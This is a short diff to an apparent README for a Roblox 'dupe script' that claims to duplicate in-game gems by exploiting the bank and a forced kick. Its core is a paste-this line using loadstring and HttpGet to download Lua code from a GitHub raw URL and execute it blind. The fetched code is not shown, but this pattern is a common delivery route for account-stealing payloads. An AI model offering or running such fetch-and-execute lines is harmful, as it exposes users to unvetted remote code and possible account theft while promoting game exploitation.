@@ -10,6 +10,8 @@ A simple dupe script (Exclusives/Gems/Mythical).
 
 **SCRIPT IS WORKING**
 
+**README: FOR IT TO WORK, WAIT UNTIL THE SCRIPT FINISHES LOADING!**
+
 It works using the bank, it puts the choosen gem count to your bank, and in the middle of it, it kicks you, and your gems will stay in your account and your bank.
 
 Script: ```loadstring(game:HttpGet('https://raw.githubusercontent.com/JinxRBLX/psx-dupe/main/dupe.lua'))())```
